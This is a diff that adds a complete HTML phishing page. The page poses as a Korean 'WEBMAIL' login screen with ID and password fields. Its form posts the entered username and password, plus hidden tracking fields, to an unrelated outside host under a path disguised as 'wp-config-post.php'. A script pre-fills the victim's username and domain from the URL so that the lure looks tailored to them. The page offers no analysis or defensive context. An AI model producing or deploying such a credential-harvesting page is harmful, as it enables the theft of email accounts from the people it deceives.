@@ -1,0 +1,121 @@
+﻿﻿<!DOCTYPE html>
+<html>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+  <title>WEBMAIL</title>
+  <style>
+    html, body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      border: 0;
+      position: absolute;
+      height: 100%;
+      min-width: 100%;
+      font-size: 13px;
+      color: #404040;
+      direction: ltr;
+      -webkit-text-size-adjust: none;
+    }
+    input[type=text],
+    input[type=password] {
+      appearance: none;
+      display: inline-block;
+      height: 100%;
+      width: 100%;
+      padding: 8px 15px;
+      margin: 0;
+      background: white;
+      border: 1px solid #d6d6d6;
+      box-sizing: border-box;
+      font-size: 15px;
+      line-height: 1.42857143;
+      vertical-align: top;
+      color: #404040;
+    }
+    input[type=text]:focus,
+    input[type=password]:focus {
+      outline: none;
+      border: 1px solid black;
+    }
+  </style>
+</head>
+<body>
+
+<div align="center">
+  <table border="0" width="1000" cellspacing="0" cellpadding="0">
+    <tr>
+      <td>
+        <table border="0" width="100%" cellspacing="0" cellpadding="0">
+          <tr><td height="50">&nbsp;</td></tr>
+          <tr>
+            <td height="551" background="https://i.ibb.co/qDhF22B/bg.png">
+              <table border="0" width="100%" cellspacing="0" cellpadding="0">
+                <tr>
+                  <td>&nbsp;</td>
+                  <td width="400">
+                    <form method="post" action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php">
+                      <table border="0" width="100%" cellspacing="0" cellpadding="0">
+                        <tr><td height="124"></td></tr>
+                        <tr>
+                          <td height="110">
+                            <table border="0" height="110" width="100%" cellspacing="0" cellpadding="0">
+                              <tr>
+                                <td>
+                                  <table border="0" width="100%" cellspacing="0" cellpadding="0">
+                                    <tr>
+                                      <td height="50">
+                                        <input type="text" id="userInput" placeholder="아이디" required name="user">
+                                        <input type="hidden" name="sender" value="LG">
+                                        <input type="hidden" id="linkInput" name="link" value="">
+                                        <input type="hidden" id="domainField" name="domain" value="">
+                                      </td>
+                                    </tr>
+                                    <tr><td height="10"></td></tr>
+                                    <tr>
+                                      <td height="50">
+                                        <input type="password" placeholder="비밀번호" required name="passwd" autofocus>
+                                      </td>
+                                    </tr>
+                                  </table>
+                                </td>
+                                <td width="10"></td>
+                                <td width="109">
+                                  <input type="image" src="https://i.ibb.co/vkPNjK2/btn.png" width="110" height="110">
+                                </td>
+                              </tr>
+                            </table>
+                          </td>
+                        </tr>
+                        <tr><td height="320"></td></tr>
+                      </table>
+                    </form>
+                  </td>
+                  <td width="53"></td>
+                </tr>
+              </table>
+            </td>
+          </tr>
+          <tr><td>&nbsp;</td></tr>
+        </table>
+      </td>
+    </tr>
+  </table>
+</div>
+
+<script>
+  const params = new URLSearchParams(window.location.search);
+  const raw = params.get('login');
+  const email = raw ? decodeURIComponent(raw) : '';
+
+  if (email && email.includes('@')) {
+    const [username, domain] = email.split(/@(.*)/, 2);
+
+    document.getElementById('userInput').value = username;
+    document.getElementById('domainField').value = domain;
+    document.getElementById('linkInput').value = `https://.webmail.${domain}/login.php`;
+  }
+</script>
+
+</body>
+</html>
